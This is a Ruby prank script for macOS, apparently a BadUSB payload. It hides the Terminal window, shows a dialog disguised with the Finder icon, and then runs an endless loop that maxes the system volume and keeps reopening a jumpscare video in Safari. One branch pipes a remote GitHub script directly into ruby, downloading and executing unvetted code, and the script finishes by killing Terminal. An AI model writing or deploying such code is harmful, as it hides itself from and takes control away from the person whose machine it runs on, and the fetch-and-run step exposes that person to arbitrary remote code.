#!/usr/bin/env ruby
require 'open-uri'
require 'tempfile'

# --- Hide Terminal Immediately ---
system("osascript -e 'tell application \"Terminal\" to set visible of front window to false'")

# --- Helper: Display Dialog with Finder Icon via AppleScript ---
def display_dialog(message, buttons, default)
  button_list = "{" + buttons.map { |b| "\"#{b}\"" }.join(", ") + "}"
  ascript = %Q{
    display dialog "#{message}" buttons #{button_list} default button "#{default}" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns"
  }
  output = `osascript -e '#{ascript}'`
  if output =~ /button returned:\s*(.+)/
    return $1.strip
  else
    return nil
  end
end

# --- Volume Control: Set System Volume to Maximum ---
def set_volume_to_max
  if system("command -v osascript > /dev/null 2>&1")
    system("osascript -e 'set volume output volume 100'")
  elsif system("command -v amixer > /dev/null 2>&1")
    system("amixer set Master 100%")
  else
    puts "Volume control not supported on this system."
  end
end

# --- Create Temporary HTML for Jumpscare ---
def create_jumpscare_html(video_url)
  html_content = <<-HTML
<html>
  <head>
    <meta charset="UTF-8">
    <title>JumpScare</title>
    <style>
      html, body {
        margin: 0; padding: 0; height: 100%; background-color: black;
      }
      video {
        width: 100%; height: 100%; object-fit: cover;
      }
    </style>
  </head>
  <body>
    <video id="video" autoplay muted playsinline>
      <source src="#{video_url}" type="video/mp4">
      Your browser does not support the video tag.
    </video>
    <script>
      var video = document.getElementById('video');
      video.play();
      video.addEventListener('loadeddata', function() {
        // After 500ms, unmute and play.
        setTimeout(function(){
          video.muted = false;
          video.play();
        }, 500);
      });
    </script>
  </body>
</html>
  HTML

  temp = Tempfile.new(['jumpscare', '.html'])
  temp.write(html_content)
  temp.close
  temp.path
end

# --- Persistent Jumpscare Mode ---
def persistent_jumpscare(video_url)
  html_file = create_jumpscare_html(video_url)
  
  loop do
    set_volume_to_max
    # Open the jumpscare page in Safari.
    system("open -a Safari '#{html_file}'")
    # Immediately hide Safari's front window.
    system("osascript -e 'tell application \"Safari\" to set visible of front window to false'")
    # Wait 0.75 seconds (0.5 + 0.25 extra) before unhiding.
    sleep 0.75
    # Unhide Safari so the jumpscare becomes visible.
    system("osascript -e 'tell application \"Safari\" to set visible of front window to true'")
    # Let the jumpscare play for 1 second.
    sleep 1

    # Check if any Safari tab still has "jumpscare" in its URL.
    check_script = %Q{
      tell application "Safari"
        set found to false
        repeat with w in windows
          repeat with t in tabs of w
            if (URL of t) contains "jumpscare" then set found to true
          end repeat
        end repeat
        return found
      end tell
    }
    result = `osascript -e '#{check_script}'`.strip.downcase
    # If not found (i.e. if the page was closed), the loop will re-open it.
    sleep 3
  end
end

# --- Run Secret (Rickroll) Script ---
def run_secret_script
  system("curl -s https://raw.githubusercontent.com/Hrampell/badusb_v2/main/secret.sh | ruby")
end

# --- Subscriber Action ---
# Now includes four options: "Sydney lover", "Hawk", "Tuah", and "Girl Power!"
def subscriber_action(choice)
  ch = choice.strip.downcase
  case ch
  when "hawk"
    run_secret_script
    system("killall Terminal")
    exit 0
  when "tuah"
    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
  when "sydney lover"
    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4")
  when "girl power!", "girl power", "girlpower"
    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4")
  else
    puts "Unexpected button choice: #{choice}"
  end
end

# --- Main Program Flow ---
subscribed = display_dialog("Are you subscribed to MrWoooper?", ["Yes", "No"], "Yes")
if subscribed.nil?
  puts "No response received. Exiting."
  exit 0
end

if subscribed.downcase == "no"
  # Non-subscriber branch: Immediately play jumpscare using jumpscare2.mp4.
  sleep 1
  video_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4"
  persistent_jumpscare(video_url)
  # (Persistent loop does not exit; Terminal kill not reached in this branch.)
else
  # Subscriber branch: Display a dialog with four buttons.
  button_choice = display_dialog("Choose a button:", ["Sydney lover", "Hawk", "Tuah", "Girl Power!"], "Hawk")
  if button_choice.nil?
    puts "No button chosen. Exiting."
    exit 0
  end
  subscriber_action(button_choice)
  system("killall Terminal")
  exit 0
end
